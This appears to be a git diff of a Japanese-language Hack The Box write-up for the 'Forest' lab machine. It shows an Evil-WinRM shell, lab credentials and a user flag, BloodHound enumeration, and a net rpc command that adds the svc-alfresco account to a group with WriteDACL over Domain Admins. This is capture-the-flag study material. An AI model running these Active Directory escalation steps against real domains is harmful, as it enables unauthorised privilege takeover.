@@ -1,3 +1,5 @@
+https://app.hackthebox.com/machines/Forest
+
 ## STEP 1
 ```sh
 └─$ rustscan -a 10.129.95.210 --scripts none
@@ -206,4 +208,42 @@ Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplay
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> cat C:\Users\svc-alfresco\Desktop\user.txt
 b52be94e8c18f9cdabcfb7709a922a97
+```
+
+
+## STEP 3
+bloodhoundを回す
+```sh
+└─$ bloodhound-python -c ALL -d htb.local -u svc-alfresco -p s3rvice -ns 10.129.191.172 --zip
+INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
+INFO: Found AD domain: htb.local
+INFO: Getting TGT for user
+WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (FOREST.htb.local:88)] [Errno -2] Name or service not known
+INFO: Connecting to LDAP server: FOREST.htb.local
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 2 computers
+INFO: Connecting to LDAP server: FOREST.htb.local
+INFO: Found 32 users
+INFO: Found 76 groups
+INFO: Found 2 gpos
+INFO: Found 15 ous
+INFO: Found 20 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: EXCH01.htb.local
+INFO: Querying computer: FOREST.htb.local
+INFO: Done in 02M 00S
+```
+svc-alfresoの上位グループは、「EXCHANGE WINDOWS PErMISSIONS」グループに対して、GenericAllを持つ  
+また、「EXCHANGE WINDOWS PErMISSIONS」グループは「DOMAIN ADMINS」に対してWriteDACLを持つ
+<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Forest_01.png">  
+svc-alfrescoを「EXCHANGE WINDOWS PErMISSIONS」グループに追加した
+```sh
+└─$ net rpc group addmem "EXCHANGE WINDOWS PERMISSIONS" "svc-alfresco" -U "htb.local"/"svc-alfresco"%"s3rvice" -S 10.129.191.172 
+                                                                                                                                 
+
+└─$ net rpc group members "EXCHANGE WINDOWS PERMISSIONS" -U "htb.local"/"svc-alfresco"%"s3rvice" -S 10.129.191.172
+HTB\Exchange Trusted Subsystem
+HTB\svc-alfresco
 ```
